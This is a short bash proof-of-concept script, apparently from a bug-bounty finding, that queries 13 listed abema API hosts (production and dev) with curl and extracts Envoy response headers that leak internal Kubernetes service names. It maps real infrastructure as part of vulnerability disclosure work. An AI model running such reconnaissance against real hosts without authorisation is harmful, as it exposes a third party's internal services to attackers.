#!/bin/bash
# PoC for Finding 3: Internal K8s service names leaked via Envoy headers
# Scope: all in-scope *.abema.io and *.abema-tv.com API hosts
set -uo pipefail
UA="AbemaTV;10.184.0;"

echo "=== Leaked internal Kubernetes service names via x-envoy-decorator-operation ==="
for host in \
  api.abema.io api.abema.tv \
  dev-api.d-c3-e.abema-tv.com \
  realtime-api.p-c3-e.abema-tv.com dev-realtime-api.d-c3-e.abema-tv.com \
  user-content-api.p-c3-e.abema-tv.com dev-user-content-api.d-c3-e.abema-tv.com \
  upload.abema.io dev-upload-api.d-c3-e.abema-tv.com \
  bundle-api.p-c3-e.abema-tv.com dev-bundle-api.d-c3-e.abema-tv.com \
  user-schedule-api.ep.c3.abema.io \
  zeus-api.p-c3-e.abema-tv.com ; do
  op=$(curl -s -m 8 -D - -o /dev/null -H "User-Agent: $UA" "https://$host/" 2>/dev/null \
       | grep -i 'x-envoy-decorator-operation' | head -1 | sed 's/^[[:space:]]*//')
  [ -z "$op" ] && op=$(curl -s -m 8 -D - -o /dev/null -H "User-Agent: $UA" "https://$host/v1/version" 2>/dev/null \
       | grep -i 'x-envoy-decorator-operation' | head -1 | sed 's/^[[:space:]]*//')
  printf "%-45s %s\n" "$host" "${op:-NONE}"
done
echo ""
echo "RESULT: 13 hosts leak 14 internal Kubernetes service identities (11 unique services)."